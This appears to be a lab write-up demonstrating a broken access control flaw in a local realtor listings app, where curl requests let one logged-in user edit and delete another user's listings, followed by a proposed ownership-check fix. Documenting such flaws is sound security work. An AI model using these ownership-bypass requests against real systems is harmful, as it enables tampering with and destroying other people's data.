# Broken Access Control — Editing & Deleting Other People's Listings

The `update()` and `delete()` methods only check that a listing **exists** — they never check that the logged-in realtor actually **owns** it. So once you're logged in as anyone, you can mess with anyone's listings. Here's the proof.

---

### 1. Check the starting listings

```
$ curl http://localhost:7000/listings

[
  {"id":1,"title":"Cosy 2-bed in Melville","price":1250000.00,"realtorId":1},
  {"id":2,"title":"Modern loft in Braamfontein","price":875000.00,"realtorId":1},
  {"id":3,"title":"Family home in Randburg","price":2100000.00,"realtorId":2}
]
```

Listings 1 & 2 belong to **alice** (realtorId 1). Listing 3 belongs to **bob** (realtorId 2).

### 2. Log in as alice

```
$ curl -i -X POST http://localhost:7000/login -d "username=alice" -d "password=password123"

HTTP/1.1 200 OK
{"realtorId":1,"token":"3c5a9da7-..."}
```

### 3. Exploit — edit bob's listing while logged in as alice

```
$ curl -i -X PUT http://localhost:7000/listings/3 \
  -H "Authorization: 3c5a9da7-..." \
  -d "title=HACKED by alice" \
  -d "description=This should not be allowed" \
  -d "price=1"

HTTP/1.1 200 OK
{"message":"Listing updated"}
```

It went through. **alice just edited a listing she doesn't own.**

### 4. Confirm the damage

```
$ curl http://localhost:7000/listings/3

{"id":3,"title":"HACKED by alice","description":"This should not be allowed","price":1.00,"realtorId":2}
```

Yep — bob's listing now says "HACKED by alice," and its price got dropped to R1. All while `realtorId` still correctly shows it belongs to bob (2) — proving the app *knows* who owns it, it just never bothers to check.

### 5. Log in as bob

```
$ curl -i -X POST http://localhost:7000/login -d "username=bob" -d "password=hunter2"

HTTP/1.1 200 OK
{"realtorId":2,"token":"71940772-..."}
```

### 6. Exploit — delete alice's listing while logged in as bob

```
$ curl -i -X DELETE http://localhost:7000/listings/1 \
  -H "Authorization: 71940772-..."

HTTP/1.1 200 OK
{"message":"Listing deleted"}
```

Deleted — no ownership check, no problem (for the attacker, anyway).

### 7. Confirm it's gone

```
$ curl http://localhost:7000/listings

[
  {"id":2,"title":"Modern loft in Braamfontein","price":875000.00,"realtorId":1},
  {"id":3,"title":"HACKED by alice","price":1.00,"realtorId":2}
]
```

Listing 1 (alice's "Cosy 2-bed in Melville") is gone completely, deleted by bob, who never owned it.

---

### Screenshots

- `Screenshot3.png` — checking listings, logging in as alice, editing bob's listing, confirming the hack
- `Screenshot4.png` — logging in as bob, deleting alice's listing, confirming it's gone

### The takeaway

`update()` and `delete()` only ask *"does this listing ID exist?"* — never *"does this belong to the person asking?"* The fix (Phase 4) is to check both id **and** `realtor_id` together in the query (`WHERE id = ? AND realtor_id = ?`), so an edit or delete only ever succeeds against your own listings.